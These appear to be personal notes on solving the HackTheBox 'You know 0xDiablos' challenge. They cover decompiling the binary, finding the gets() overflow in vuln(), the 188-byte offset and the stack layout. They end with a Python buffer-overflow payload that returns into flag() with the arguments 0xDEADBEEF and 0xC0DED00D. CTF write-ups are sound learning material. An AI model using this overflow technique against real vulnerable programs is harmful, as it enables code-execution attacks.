- check file
	![[You_know_0xDiablos_HTB-1.png]]
- ida decompile
	![[You_know_0xDiablos_HTB-2.png]]
	![[You_know_0xDiablos_HTB-3.png]]
	![[You_know_0xDiablos_HTB-4.png]]
	- change to hex -> a1 == 0xDEADBEEF && a2 == 0xC0DED00D
	- `main()` : no call to `flag()` -> add flag func address to payload
	- `vuln()`:
		- `gets(s)` -> no char limit -> buf overflow
	- `flag()`:
		- if a1 = 0xDEADBEEF and a2 = 0xC0DED00D -> print flag
		-> set arg1 = 0xDEADBEEF and arg2 = 0xC0DED00D
- stack frame (low to high): buffer -> saved ebp -> flag func address -> fake_ret -> arg1 -> arg2
- gdb
	- offset = 188
	![[You_know_0xDiablos_HTB-5.png|618]]
	- find flag addr
	![[You_know_0xDiablos_HTB-6.png]]
- payload:
	```python
	flag_addr = 0x80491e2
	payload = b'A'*188 # buffer overflow
	payload += p32(flag_addr) + 4*b'B' # return address
	payload += p32(0xDEADBEEF) + p32(0xC0DED00D) # arguments
	```
- have to add fake addr otherwise when the flag func runs `ret`, cpu will jump to arg1 value 